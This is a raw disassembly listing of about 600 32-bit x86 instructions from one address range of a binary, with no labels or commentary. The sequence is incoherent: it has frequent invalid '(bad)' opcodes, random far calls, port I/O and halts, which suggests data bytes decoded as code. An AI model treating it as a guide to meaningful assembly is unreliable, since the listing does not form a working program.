  4149ac:	inc    eax
  4149ad:	adc    BYTE PTR [eax],dh
  4149af:	jns    0x4149bc
  4149b1:	cdq    
  4149b2:	jp     0x414987
  4149b4:	enter  0x66d0,0xd6
  4149b8:	imul   edx,DWORD PTR [esi-0x42],0x38
  4149bc:	lods   al,BYTE PTR ds:[esi]
  4149bd:	stc    
  4149be:	repnz lds ebx,FWORD PTR [edi]
  4149c1:	test   al,0xfe
  4149c3:	pop    edi
  4149c4:	fwait
  4149c5:	or     esp,DWORD PTR [edx+0x3c]
  4149c8:	retf   0xc1a2
  4149cb:	nop
  4149cc:	jmp    0x57d552e
  4149d1:	xchg   edx,eax
  4149d2:	stos   DWORD PTR es:[edi],eax
  4149d3:	or     al,0x94
  4149d5:	inc    ebx
  4149d6:	sbb    BYTE PTR [ebp+0x1c5e0d8a],0xca
  4149dd:	cmc    
  4149de:	cmp    ecx,ebp
  4149e0:	ror    DWORD PTR [eax+0x39],1
  4149e3:	add    DWORD PTR [edx],0x49
  4149e6:	push   0xffffff9a
  4149e8:	inc    ebp
  4149e9:	jp     0x414a4a
  4149eb:	mov    al,0x1
  4149ed:	add    eax,0xfe76bdb2
  4149f2:	add    bh,bl
  4149f4:	in     eax,0xf4
  4149f6:	jns    0x414a40
  4149f8:	(bad)  
  4149f9:	push   edi
  4149fa:	aas    
  4149fb:	sub    DWORD PTR [esi],esp
  4149fd:	(bad)  
  4149fe:	mov    BYTE PTR [edx-0x7369cf7b],al
  414a04:	mov    esi,0xadfb5ddb
  414a09:	cmc    
  414a0a:	retf   0x877c
  414a0d:	popa   
  414a0e:	bound  ebp,QWORD PTR [edx]
  414a10:	retf   
  414a11:	dec    esp
  414a12:	fsqrt  
  414a14:	xchg   esi,eax
  414a15:	jl     0x414a7a
  414a17:	ret    0x94ac
  414a1a:	cmp    BYTE PTR [edi+0x7a1bec04],bh
  414a20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a21:	mov    esp,0x9193488b
  414a26:	fs aad 0x80
  414a29:	jbe    0x414a6d
  414a2b:	pop    ss
  414a2c:	int    0xbe
  414a2e:	outs   dx,DWORD PTR ds:[esi]
  414a2f:	pop    ebp
  414a30:	and    esi,DWORD PTR [eax+eiz*1]
  414a33:	jbe    0x414a33
  414a35:	xor    BYTE PTR [ebp+0x26],cl
  414a38:	sub    BYTE PTR [edx+edx*1],bh
  414a3b:	inc    esi
  414a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a3d:	mov    ?,WORD PTR [ebx-0x48]
  414a40:	dec    ebp
  414a41:	pop    ebp
  414a42:	jae    0x414a0c
  414a44:	in     eax,0x57
  414a46:	shr    dl,cl
  414a48:	and    ecx,esp
  414a4a:	test   eax,0xc05df5ca
  414a4f:	scas   eax,DWORD PTR es:[edi]
  414a50:	fisttp WORD PTR [eax+0x48b05e9d]
  414a56:	cmp    bh,ah
  414a58:	mov    eax,ds:0x3c0fe24f
  414a5d:	rol    BYTE PTR [edx+0x40],0x6c
  414a61:	jne    0x414add
  414a63:	xchg   edx,eax
  414a64:	(bad)  
  414a65:	sub    al,0xb2
  414a67:	test   al,0xac
  414a69:	or     BYTE PTR [edi-0x36],bl
  414a6c:	enter  0x856,0x43
  414a70:	and    eax,0x568ee900
  414a75:	popa   
  414a76:	mov    DWORD PTR [ecx],ecx
  414a78:	nop
  414a79:	jl     0x414a10
  414a7b:	mov    edx,0xcdd9bd16
  414a80:	or     BYTE PTR [ecx-0x6e],dh
  414a83:	loopne 0x414a46
  414a85:	xlat   BYTE PTR ds:[ebx]
  414a86:	imul   esp,DWORD PTR [esi+0x7],0x5b
  414a8a:	dec    edx
  414a8b:	inc    ebx
  414a8c:	mov    es,WORD PTR [eax+0x11]
  414a8f:	mov    edx,0x7f74a0cb
  414a94:	sub    ecx,DWORD PTR [ecx*8+0x34a24920]
  414a9b:	ss jno 0x414a74
  414a9e:	loop   0x414aba
  414aa0:	(bad)  
  414aa1:	(bad)  
  414aa2:	out    0xb1,eax
  414aa4:	sub    eax,0xa55d200d
  414aa9:	cmp    BYTE PTR [esi],cl
  414aab:	gs (bad) 
  414aad:	mov    ch,0x8
  414aaf:	(bad)  
  414ab0:	loop   0x414a97
  414ab2:	mov    ds:0x47f98033,al
  414ab7:	mov    edx,eax
  414ab9:	pop    ebx
  414aba:	xlat   BYTE PTR ds:[ebx]
  414abb:	mov    ch,0xa2
  414abd:	aad    0xb9
  414abf:	mov    DWORD PTR [esi-0x71],esp
  414ac2:	mov    ebx,DWORD PTR [ebp-0x6a7a4d0d]
  414ac8:	dec    ebp
  414ac9:	aam    0x2c
  414acb:	out    dx,al
  414acc:	test   al,0xae
  414ace:	gs sbb eax,0x5c393654
  414ad4:	retf   0xf70d
  414ad7:	fisub  WORD PTR [edx]
  414ad9:	inc    ebp
  414ada:	shl    BYTE PTR [esi-0x58cdf2df],1
  414ae0:	mov    ch,0x63
  414ae2:	std    
  414ae3:	mov    eax,ds:0x287210f3
  414ae8:	mov    ebp,0xb7deabc7
  414aed:	out    0x76,al
  414aef:	xchg   esi,eax
  414af0:	jne    0x414ad9
  414af2:	adc    edi,DWORD PTR [ecx-0xe89267d]
  414af8:	aas    
  414af9:	and    eax,0xc524784c
  414afe:	mov    eax,0x7232bc66
  414b03:	pop    edx
  414b04:	mov    ecx,0xcc59eab8
  414b09:	retf   0xf59d
  414b0c:	fs mov cl,0xdb
  414b0f:	push   ebp
  414b10:	hlt    
  414b11:	mov    bl,0x29
  414b13:	out    0x3b,eax
  414b15:	or     al,0x1d
  414b17:	add    esp,DWORD PTR [esi+esi*4]
  414b1a:	xchg   ecx,eax
  414b1b:	adc    eax,DWORD PTR [edx]
  414b1d:	int    0xa8
  414b1f:	fnstenv [ebx-0x30]
  414b22:	and    eax,0x6ccf6db3
  414b27:	mov    ah,0x8b
  414b29:	mov    eax,0x1a9cacd2
  414b2e:	mov    cs,edi
  414b30:	push   ebx
  414b31:	or     BYTE PTR [ebx],al
  414b33:	mov    WORD PTR [edi+esi*1-0x63],es
  414b37:	jg     0x414b4f
  414b39:	jns    0x414b7e
  414b3b:	dec    edx
  414b3c:	in     eax,0xc8
  414b3e:	add    edx,DWORD PTR [edi]
  414b40:	xchg   edx,eax
  414b41:	iret   
  414b42:	push   ecx
  414b43:	retf   
  414b44:	shr    DWORD PTR [ebp+edi*8+0x48],cl
  414b48:	mov    esi,0x809838b8
  414b4d:	or     al,0x24
  414b4f:	test   dl,ch
  414b51:	push   ecx
  414b52:	or     eax,0x959aaa02
  414b57:	loope  0x414af6
  414b59:	jmp    0x414af5
  414b5b:	dec    ecx
  414b5c:	pushf  
  414b5d:	nop
  414b5e:	push   ds
  414b5f:	or     ebx,DWORD PTR [eax]
  414b61:	ja     0x414b36
  414b63:	call   0x282:0x52d8a790
  414b6a:	sub    ebx,ebx
  414b6c:	dec    eax
  414b6d:	xor    ah,BYTE PTR [edi+0x47fdc47]
  414b73:	in     eax,0x50
  414b75:	xor    DWORD PTR [ecx-0x7544ef0],esi
  414b7b:	or     DWORD PTR [esi+0x591a7bdc],ebx
  414b81:	jp     0x414ba9
  414b83:	or     ch,0x96
  414b86:	mov    dh,0x4a
  414b88:	not    BYTE PTR [esi+0x20]
  414b8b:	sub    eax,0xb753581c
  414b90:	mov    ebx,0xcf24f9ed
  414b95:	mov    cl,0x29
  414b97:	ins    DWORD PTR es:[edi],dx
  414b98:	nop
  414b99:	or     DWORD PTR [edx+0xeace091],eax
  414b9f:	adc    DWORD PTR [ecx+0x7d],ebx
  414ba2:	xchg   edi,eax
  414ba3:	je     0x414c19
  414ba5:	int3   
  414ba6:	scas   eax,DWORD PTR es:[edi]
  414ba7:	dec    edx
  414ba8:	xchg   bh,al
  414baa:	jge    0x414c0c
  414bac:	call   0x1c37:0x305755b2
  414bb3:	jecxz  0x414bff
  414bb5:	xor    ecx,ecx
  414bb7:	lahf   
  414bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb9:	dec    edi
  414bba:	xchg   edx,eax
  414bbb:	ret    0x9242
  414bbe:	adc    eax,0xbf1cb822
  414bc3:	add    ch,BYTE PTR [edx-0xb7f470c]
  414bc9:	mov    al,BYTE PTR [eax]
  414bcb:	imul   esp,DWORD PTR [esi-0x42],0x8df65eaf
  414bd2:	rol    BYTE PTR [ecx],cl
  414bd4:	xor    ch,BYTE PTR ds:0xfeb65d87
  414bda:	not    DWORD PTR [ebx+0x156ba320]
  414be0:	inc    edi
  414be1:	imul   ecx,DWORD PTR [ebx+ebx*8],0xffffffa8
  414be5:	retf   
  414be6:	int    0xaf
  414be8:	adc    eax,0xbfa2efd3
  414bed:	jg     0x414bb8
  414bef:	push   ebp
  414bf0:	ja     0x414b96
  414bf2:	push   0x6f0dd24a
  414bf7:	lds    edx,FWORD PTR [eax]
  414bf9:	mov    cl,0xc
  414bfb:	pop    ebp
  414bfc:	jo     0x414bf1
  414bfe:	fs cdq 
  414c00:	or     DWORD PTR [ebp+0x39033b5a],0xffffffeb
  414c07:	add    al,0x8d
  414c09:	mov    ebx,0xc4456f7e
  414c0e:	adc    al,0x38
  414c10:	jp     0x414be6
  414c12:	xchg   ebp,eax
  414c13:	mov    al,ds:0x919cde0b
  414c18:	mov    edi,0x1d51445c
  414c1d:	jae    0x414c2b
  414c1f:	(bad)  
  414c20:	ja     0x414c5f
  414c22:	or     al,0xe0
  414c24:	or     al,0xf2
  414c26:	jmp    0x414bec
  414c28:	(bad)  [edi]
  414c2a:	cwde   
  414c2b:	xchg   ebx,esp
  414c2d:	loopne 0x414c6f
  414c2f:	xor    ecx,DWORD PTR [ebx]
  414c31:	dec    ebx
  414c33:	mov    ah,0x2b
  414c35:	out    0xe5,al
  414c37:	add    ebx,DWORD PTR [edi]
  414c39:	jmp    0x414c60
  414c3b:	mov    ebp,DWORD PTR [eax+0x1d]
  414c3e:	stc    
  414c3f:	and    ah,BYTE PTR [ebx-0x54]
  414c42:	pusha  
  414c43:	mov    cl,0x1b
  414c45:	arpl   WORD PTR [ebp-0x47],bx
  414c48:	pop    edx
  414c49:	int3   
  414c4a:	addr16 adc cl,bl
  414c4d:	jl     0x414c67
  414c4f:	(bad)  
  414c50:	lea    edx,[ecx+eiz*2]
  414c53:	dec    esp
  414c54:	(bad)  
  414c55:	aas    
  414c56:	xchg   edi,eax
  414c57:	dec    edx
  414c58:	xchg   esi,eax
  414c59:	push   ebp
  414c5a:	add    BYTE PTR [ebx-0x79],0x30
  414c5e:	xlat   BYTE PTR ds:[ebx]
  414c5f:	test   ch,cl
  414c61:	push   ecx
  414c62:	ds jp  0x414cb3
  414c65:	popa   
  414c66:	cli    
  414c67:	aam    0x90
  414c69:	int3   
  414c6a:	add    ecx,DWORD PTR [ecx+0x15db50ec]
  414c70:	lods   eax,DWORD PTR ds:[esi]
  414c71:	arpl   WORD PTR [ecx-0x3d],bp
  414c74:	retf   
  414c75:	outs   dx,BYTE PTR ds:[esi]
  414c76:	xchg   edx,eax
  414c77:	mov    ch,0x60
  414c79:	xchg   edx,eax
  414c7a:	icebp  
  414c7b:	add    al,0x3
  414c7d:	std    
  414c7e:	xor    BYTE PTR [ecx],0x81
  414c81:	dec    esi
  414c82:	popfw  
  414c84:	add    edi,DWORD PTR [ebp+0x70]
  414c87:	or     al,BYTE PTR [esi]
  414c89:	xchg   ebx,eax
  414c8a:	push   ebp
  414c8b:	lock daa 
  414c8d:	and    DWORD PTR [eax-0x2a],edi
  414c90:	xchg   edi,eax
  414c91:	mov    al,ds:0x127c7a52
  414c96:	mov    esi,0x456e84db
  414c9b:	loopne 0x414c6f
  414c9d:	sbb    BYTE PTR [edi+0x4f58bffa],cl
  414ca3:	popa   
  414ca4:	mov    ecx,DWORD PTR [bx+di-0x4d]
  414ca8:	mov    ebx,0xb7855d65
  414cad:	(bad)  
  414cae:	repnz sub eax,0xae245cf6
  414cb4:	call   0x8ff1:0x52e4dc45
  414cbb:	popa   
  414cbc:	nop
  414cbd:	and    al,BYTE PTR [ecx]
  414cbf:	push   esi
  414cc0:	fsub   QWORD PTR [edi-0x6aca7d08]
  414cc6:	xchg   edx,eax
  414cc7:	cmp    al,0x92
  414cc9:	xchg   DWORD PTR [ebp+0x56],esi
  414ccc:	adc    eax,DWORD PTR [esp+eax*2-0x16ed0b32]
  414cd3:	jae    0x414d31
  414cd5:	xor    DWORD PTR [edx-0x59e58cdb],0xffffff81
  414cdc:	jmp    0xb48e:0xfb4003d7
  414ce3:	xor    al,0xd
  414ce5:	ja     0x414cac
  414ce7:	ins    DWORD PTR es:[edi],dx
  414ce8:	aam    0x6d
  414cea:	retf   0x962
  414ced:	xor    dh,BYTE PTR [edi]
  414cef:	mov    dl,0xa6
  414cf1:	cmp    DWORD PTR [esp+eax*2],edx
  414cf4:	inc    eax
  414cf5:	dec    ecx
  414cf6:	jns    0x414d18
  414cf8:	or     DWORD PTR [edx],0x37
  414cfb:	loop   0x414cd0
  414cfd:	xchg   esi,eax
  414cfe:	jae    0x414d46
  414d00:	mov    dh,0x49
  414d02:	or     edx,edi
  414d04:	xchg   ebx,eax
  414d05:	mov    DWORD PTR [esp+edi*1],esp
  414d08:	pop    esp
  414d09:	add    al,0x16
  414d0b:	mov    ebp,0x75ee6e6a
  414d10:	add    BYTE PTR [edi+0x4c03d47a],bl
  414d16:	or     al,0x7f
  414d18:	push   es
  414d19:	call   0x4be43159
  414d1e:	stos   BYTE PTR es:[edi],al
  414d1f:	inc    esi
  414d20:	pop    ds
  414d21:	push   edi
  414d22:	aam    0xa4
  414d24:	adc    bl,cl
  414d26:	das    
  414d27:	xchg   esi,eax
  414d28:	mov    al,cl
  414d2a:	test   al,0x37
  414d2c:	xchg   esi,eax
  414d2d:	cmp    al,0xc3
  414d2f:	mov    ecx,0x37aa394c
  414d34:	and    esp,edi
  414d36:	push   edx
  414d37:	test   ch,dh
  414d39:	fisub  DWORD PTR [edx]
  414d3b:	and    ch,cl
  414d3d:	pop    ss
  414d3e:	xchg   BYTE PTR [esi+0x73],bl
  414d41:	pop    ebx
  414d42:	jno    0x414d70
  414d44:	retf   
  414d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d46:	push   0xffffffb9
  414d48:	add    eax,0x9764db9b
  414d4d:	out    dx,eax
  414d4e:	loopne 0x414ce8
  414d50:	lea    ebx,[ebp-0x786b2107]
  414d56:	les    ebp,FWORD PTR [edx+edi*8]
  414d59:	cs xchg edi,eax
  414d5b:	outs   dx,BYTE PTR ds:[esi]
  414d5c:	jl     0x414db0
  414d5e:	adc    bl,BYTE PTR [edx-0x7f]
  414d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d62:	daa    
  414d63:	add    dh,BYTE PTR [esi+edx*1-0x6c]
  414d67:	dec    ebx
  414d68:	or     esp,edi
  414d6a:	sbb    BYTE PTR [edx],dl
  414d6c:	iret   
  414d6d:	and    BYTE PTR [bp+di],bh
  414d70:	ins    DWORD PTR es:[edi],dx
  414d71:	sbb    DWORD PTR [ebp+0x3a54d7cf],edx
  414d77:	or     cl,bl
  414d79:	std    
  414d7a:	jae    0x414dc6
  414d7c:	imul   ebx,DWORD PTR [ebp+0x1af7df06],0x25e6ef2f
  414d86:	mov    eax,0xadc2757d
  414d8b:	jbe    0x414da6
  414d8d:	or     al,0x25
  414d8f:	arpl   WORD PTR [ecx+edx*8],cx
  414d92:	fdivr  QWORD PTR [eax-0x3e8df6db]
  414d98:	ret    0xecf8
  414d9b:	push   ecx
  414d9c:	sbb    ch,BYTE PTR [edx+esi*2+0x7c64f568]
  414da3:	int    0x78
  414da5:	in     eax,0x5a
  414da7:	in     eax,0x65
  414da9:	mov    ebx,0x33b41aae
  414dae:	mov    edx,0x3fc4eae
  414db3:	or     al,0x87
  414db5:	das    
  414db6:	sbb    BYTE PTR [edi],bh
  414db8:	jl     0x414d75
  414dba:	fcomp  DWORD PTR [eax-0x3d]
  414dbd:	popf   
  414dbe:	dec    edx
  414dbf:	adc    cl,BYTE PTR [ecx-0x4c]
  414dc2:	jge    0x414daf
  414dc4:	fcmovnbe st,st(1)
  414dc6:	add    edx,eax
  414dc8:	icebp  
  414dc9:	retf   0xd057
  414dcc:	mov    WORD PTR [esi],gs
  414dce:	xchg   esp,eax
  414dcf:	adc    BYTE PTR [ebx],ch
  414dd1:	adc    eax,0x92c59d95
  414dd6:	dec    ebx
  414dd7:	aas    
  414dd8:	and    bh,bh
  414dda:	push   ds
  414ddb:	pusha  
  414ddc:	push   0xffffffa7
  414dde:	and    bh,BYTE PTR [ebx+esi*8-0x310e626d]
  414de5:	loop   0x414dc3
  414de7:	and    BYTE PTR [edx-0x313537e7],cl
  414ded:	idiv   DWORD PTR [esi-0x18]
  414df0:	(bad)  
  414df1:	scas   al,BYTE PTR es:[edi]
  414df2:	repnz test cl,al
  414df5:	inc    ebp
  414df6:	imul   esi,DWORD PTR [edi+0xb1fcb67],0xd73b4b9b
  414e00:	test   DWORD PTR [esi],ebp
  414e02:	push   ebx
  414e03:	inc    ecx
  414e04:	dec    edi
  414e05:	imul   edx,DWORD PTR [ebp-0x4ba36a64],0x3f
  414e0c:	jno    0x414dfc
  414e0e:	jb     0x414e81
  414e10:	cli    
  414e11:	sti    
  414e12:	push   eax
  414e13:	hlt    
  414e14:	call   0x6d42:0x96b1250a
  414e1b:	neg    BYTE PTR [eax]
  414e1d:	cdq    
  414e1e:	rol    BYTE PTR [ebx+0x516bbffd],1
  414e24:	jo     0x414dc8
  414e26:	loope  0x414dfd
  414e28:	cld    
  414e29:	fidiv  WORD PTR [edi+0x6d]
  414e2c:	and    edx,DWORD PTR [ecx-0x36550c69]
  414e32:	cwde   
  414e33:	and    ch,dl
  414e35:	push   ds
  414e36:	shr    DWORD PTR [eax-0x471c429b],0x94
  414e3d:	sbb    bl,BYTE PTR [esi-0x66]
  414e40:	or     al,0xc
  414e42:	add    BYTE PTR [ebx],bl
  414e44:	es ret 0x1711
  414e48:	std    
  414e49:	jmp    DWORD PTR [ebp-0x1]
  414e4c:	arpl   di,si
  414e4e:	sbb    ch,al
  414e50:	inc    esp
  414e51:	pop    ebp
  414e52:	(bad)  
  414e53:	jge    0x414e64
  414e55:	jecxz  0x414e98
  414e57:	out    dx,eax
  414e58:	mov    ss,WORD PTR [ecx+0x2aabd8da]
  414e5e:	call   0x1e19d793
  414e63:	fcomp  DWORD PTR [ebp+0x2db877d8]
  414e69:	mov    al,0x26
  414e6b:	xor    dl,BYTE PTR [ebp-0x6f25cada]
  414e71:	shl    BYTE PTR [edx],cl
  414e73:	lahf   
  414e74:	std    
  414e75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e76:	rol    bl,0xae
  414e79:	pop    edi
  414e7a:	les    ebx,FWORD PTR [esi-0x2fbe0999]
  414e80:	out    dx,al
  414e81:	ds leave 
  414e83:	jae    0x414e40
  414e85:	mov    al,0xea
  414e87:	sbb    al,0x9b
  414e89:	mov    ah,0xa6
  414e8b:	pop    ebx
  414e8c:	mov    esp,0xee3b6884
  414e91:	stc    
  414e92:	push   edi
  414e93:	cli    
  414e94:	pop    edi
  414e95:	das    
  414e96:	shr    ah,0x9e
  414e99:	mov    ebp,0xb95e7820
  414e9e:	jne    0x414e61
  414ea0:	(bad)  
  414ea3:	xchg   BYTE PTR [edx],ch
  414ea5:	cmp    BYTE PTR [edx-0x62],bl
  414ea8:	cs dec eax
  414eaa:	fsubr  QWORD PTR [ebp-0x17]
  414ead:	pushf  
  414eae:	arpl   WORD PTR [esi-0x3c],si
  414eb1:	xchg   ecx,eax
  414eb2:	dec    edx
  414eb3:	mov    al,ds:0x7d04a584
  414eb8:	push   0xb9af2561
  414ebd:	mov    esi,0xc7a2534d
  414ec2:	sbb    eax,0xeef7b799
  414ec7:	mov    ecx,0xd7b97e67
  414ecc:	stc    
  414ecd:	int    0xf
  414ecf:	adc    ebp,DWORD PTR [ebx+edi*4+0x7b]
  414ed3:	lock xchg edi,eax
  414ed5:	or     dl,bh
  414ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ed8:	pop    edi
  414ed9:	loopne 0x414e7f
  414edb:	scas   al,BYTE PTR es:[edi]
  414edc:	mov    bl,ch
  414ede:	test   BYTE PTR [esi+0x31],al
  414ee1:	pop    edi
  414ee2:	rcl    DWORD PTR [ecx-0x7d],0x9e
  414ee6:	sbb    ecx,DWORD PTR [edi-0x45cec254]
  414eec:	inc    esp
  414eed:	push   esi
  414eee:	sahf   
  414eef:	cmpxchg dh,al
  414ef2:	popf   
  414ef3:	adc    DWORD PTR [ebp-0x37],eax
  414ef6:	mov    ds:0xbd4ad48a,al
  414efb:	pop    ds
  414efc:	test   BYTE PTR [edx+0x75],0x6b
  414f00:	clc    
  414f01:	stc    
  414f02:	int3   
  414f03:	add    edx,0x1d
  414f06:	in     eax,dx
  414f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f08:	pushf  
  414f09:	nop
  414f0a:	mov    ds:0x7b9423ab,eax
  414f0f:	rcr    DWORD PTR [eax],cl
  414f11:	xchg   ecx,eax
  414f12:	lock mov ecx,ecx
  414f15:	pop    eax
  414f16:	add    al,0xf3
  414f18:	cmp    eax,eax
  414f1a:	jge    0x414f98
  414f1c:	(bad)  
  414f1e:	(bad)  
  414f1f:	stos   DWORD PTR es:[edi],eax
  414f20:	and    DWORD PTR [eax+ecx*8-0x2b36430e],ecx
  414f27:	mov    bl,0xf9
  414f29:	aam    0x7e
  414f2b:	xchg   ebp,eax
  414f2c:	fist   DWORD PTR [edx+0x29]
  414f2f:	test   eax,0x3e1493c4
  414f34:	mov    al,ds:0xdb23d972
  414f39:	add    ah,dl
  414f3b:	inc    esp
  414f3c:	or     cl,ch
  414f3e:	popa   
  414f3f:	xchg   ebp,eax
  414f40:	sbb    BYTE PTR [edi+0x2d4b949b],al
  414f46:	xchg   edx,eax
  414f47:	mov    dh,0x2c
  414f49:	imul   ecx,DWORD PTR [ecx],0x76
  414f4c:	stos   BYTE PTR es:[edi],al
  414f4d:	xchg   ecx,eax
  414f4e:	jae    0x414ed9
  414f50:	jns    0x414f4f
  414f52:	sar    BYTE PTR [ebp+0x1438b214],0xfe
  414f59:	cmp    ch,0xbe
  414f5c:	xchg   edx,eax
  414f5d:	fadd   QWORD PTR [edx]
  414f5f:	jmp    0x414f4d
  414f61:	jmp    0x2ccc:0x6ab67772
  414f68:	pop    ds
  414f69:	sbb    eax,0xf6bdd515
  414f6e:	sbb    DWORD PTR [ebp-0x4b],ebp
  414f71:	xor    BYTE PTR [eax-0x74],0x6e
  414f75:	bound  edx,QWORD PTR [edi]
  414f77:	mov    ds:0xb0dec798,al
  414f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f7d:	adc    edi,DWORD PTR [edx+edi*1]
  414f80:	mov    BYTE PTR [ebx-0x66],0xd5
  414f84:	retf   
  414f85:	int    0x7c
  414f87:	int    0x2b
  414f89:	dec    edi
  414f8a:	pop    ss
  414f8b:	(bad)
  414f90:	sub    eax,0x12c66185
  414f95:	dec    ecx
  414f96:	call   FWORD PTR [eax+0x60beb82c]
  414f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f9d:	xchg   edx,eax
  414f9e:	imul   ebp,eax,0xd04190d9
  414fa4:	push   esi
  414fa5:	add    eax,0xb3addd8d
  414faa:	xchg   esp,eax
  414fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fac:	sub    ch,al
  414fae:	popa   
  414faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb0:	mov    esi,0x5730ff4b
  414fb5:	js     0x414ffa
  414fb7:	fneni(8087 only) 
  414fb9:	aas    
  414fba:	in     eax,dx
  414fbb:	leave  
  414fbc:	leave  
  414fbd:	inc    edx
  414fbe:	es call 0xc651:0xd9dcddeb
  414fc6:	cmp    eax,0x208a555b
  414fcb:	adc    DWORD PTR [ebx+0x3cf822e7],0x391287f9
  414fd5:	push   ss
  414fd6:	in     eax,dx
  414fd7:	mov    esi,0xce5c0196
  414fdc:	shr    DWORD PTR [ebx],0x8a
  414fdf:	xor    eax,0xa8783a0e
  414fe4:	out    0xfd,al
  414fe6:	and    BYTE PTR [eax+0x17],dl
  414fe9:	stos   DWORD PTR es:[edi],eax
  414fea:	mov    eax,0x336d3637
  414fef:	xor    esp,edi
  414ff1:	popa   
  414ff2:	stos   DWORD PTR es:[edi],eax
  414ff3:	mov    eax,0xa4d7255c
  414ff8:	mov    ds:0x26e27377,al
  414ffd:	jecxz  0x414fa5
  414fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415000:	push   es
  415001:	inc    ebx
  415002:	sti    
  415003:	mov    eax,ds:0x2af1b2
  415008:	push   0xffffffc1
  41500a:	pop    es
  41500b:	ss mov eax,0xd578bffd
  415011:	jecxz  0x414fcf
  415013:	cmp    eax,0xd3492493
  415018:	push   ebx
  415019:	ret    
  41501a:	mov    cl,0x94
  41501c:	gs ret 0x8b58
  415020:	push   ecx
  415021:	nop
  415022:	jge    0x415026
  415024:	test   al,0x90
  415026:	mov    esp,0x8a6af8c0
  41502b:	lods   eax,DWORD PTR ds:[esi]
  41502c:	rcl    cl,cl
  41502e:	inc    edi
  41502f:	cmp    al,0x94
  415031:	loope  0x415038
  415033:	lock pop eax
  415035:	out    dx,al
  415036:	jb     0x415060
  415038:	call   0x9f69:0x61e398e5
  41503f:	cwde   
  415040:	mov    ebp,0x1ce2d49c
  415045:	or     al,0x53
  415047:	dec    esp
  415048:	jb     0x415016
  41504a:	jecxz  0x415064
  41504c:	icebp  
  41504d:	sub    eax,0x9c4f10b0
  415052:	mov    ebp,0x43449aa0
  415057:	les    ebp,FWORD PTR [esi+0x6]
  41505a:	mov    DWORD PTR [ecx],esp
  41505c:	push   edx
  41505d:	cmp    ebx,ebp
  41505f:	jnp    0x41509e
  415061:	scas   eax,DWORD PTR es:[edi]
  415062:	jmp    0x415011
  415064:	cmp    DWORD PTR [ecx-0x225cf3fb],esi
  41506a:	jae    0x415071
  41506c:	fwait
  41506d:	push   edx
  41506e:	sub    ah,BYTE PTR [esi+0x61fa0d7]
  415074:	cmp    al,0x44
  415077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415078:	or     BYTE PTR [ebp+0x28d4a159],ch
  41507e:	push   ss
  41507f:	dec    ebx
  415080:	popa   
  415081:	scas   al,BYTE PTR es:[edi]
  415082:	gs pop ebx
  415084:	(bad)  
  415085:	jbe    0x4150fd
  415087:	stc    
  415088:	loop   0x41507a
  41508a:	retf   
  41508b:	popa   
  41508c:	add    edx,DWORD PTR [ecx-0x4]
  41508f:	push   edx
  415090:	test   DWORD PTR [edi],esi
  415092:	jae    0x41509e
  415094:	pop    edx
  415095:	in     al,0x15
  415097:	shl    BYTE PTR [edx],cl
  415099:	dec    ebp
  41509a:	push   0xbb9eb819
  41509f:	sub    BYTE PTR [ecx-0x39],ah
  4150a2:	lea    ebx,[edi-0x22]
  4150a5:	aaa    
  4150a6:	sar    BYTE PTR [edx],0x98
  4150a9:	les    edi,FWORD PTR [edx-0x47204c49]
  4150af:	int3   
  4150b0:	lea    esp,[ecx-0x54]
  4150b3:	jecxz  0x4150fe
  4150b5:	adc    al,0x25
  4150b7:	icebp  
  4150b8:	call   0xfb86c405
  4150bd:	xor    bl,BYTE PTR [ebx]
  4150bf:	adc    bl,dh
  4150c1:	ja     0x41512b
  4150c3:	dec    edi
  4150c4:	(bad)  
  4150c5:	int3   
  4150c6:	mov    ebx,0x460ad632
  4150cb:	stc    
  4150cc:	dec    eax
  4150cd:	inc    edx
  4150ce:	or     DWORD PTR [ecx+0x44],edx
  4150d1:	fistp  DWORD PTR ds:0x1e4f6f2d
  4150d7:	mov    bl,0x81
  4150d9:	lds    ebp,FWORD PTR ds:0x704d5091
  4150df:	leave  
  4150e0:	stc    
  4150e1:	mov    esi,0x28a3dd0e
  4150e6:	leave  
  4150e7:	fnsetpm(287 only) 
  4150e9:	jae    0x415086
  4150eb:	pop    ss
  4150ec:	dec    esi
  4150ed:	sbb    eax,0x184c0288
  4150f2:	sbb    WORD PTR [ebx],dx
  4150f5:	push   ebp
  4150f6:	leave  
  4150f7:	jne    0x4150a4
  4150f9:	jne    0x4150bb
  4150fb:	fwait
  4150fc:	push   esi
  4150fd:	jle    0x415162
  4150ff:	icebp  
  415100:	add    esi,ecx
  415102:	sbb    bh,cl
  415104:	push   ecx
  415105:	or     ebx,DWORD PTR [esi+0xa7c07ee]
  41510b:	mov    ebp,0x2f1fcc5c
  415110:	fistp  QWORD PTR [ecx]
  415112:	xlat   BYTE PTR ds:[ebx]
  415113:	dec    esi
  415114:	(bad)  
  415115:	xchg   edi,eax
  415116:	stos   DWORD PTR es:[edi],eax
  415117:	mov    DWORD PTR [eax-0x6a],ebx
  41511a:	rcl    BYTE PTR [edi-0x1fdf1dd7],1
  415120:	mov    DWORD PTR [eax-0xc],eax
  415123:	jmp    0x4150dd
  415125:	out    0xd8,al
  415127:	or     cl,ch
  415129:	mov    edi,0x8742f08d
  41512e:	aaa    
  41512f:	call   0x6c12e710
  415134:	out    dx,eax
  415135:	xlat   BYTE PTR ds:[ebx]
  415136:	sub    dh,BYTE PTR [edi-0x77]
  415139:	adc    BYTE PTR [edx-0x7c],cl
  41513c:	shl    BYTE PTR ds:0xe28f2a30,0xca
  415143:	pop    edi
  415144:	sbb    BYTE PTR [ecx],ch
  415146:	adc    eax,0xfe85b002
  41514b:	cmc    
  41514c:	aad    0xfe
  41514e:	or     DWORD PTR [bp+di],esi
  415151:	(bad)  
  415152:	shl    BYTE PTR [edx+0x2aed025f],1
  415158:	jge    0x4150e3
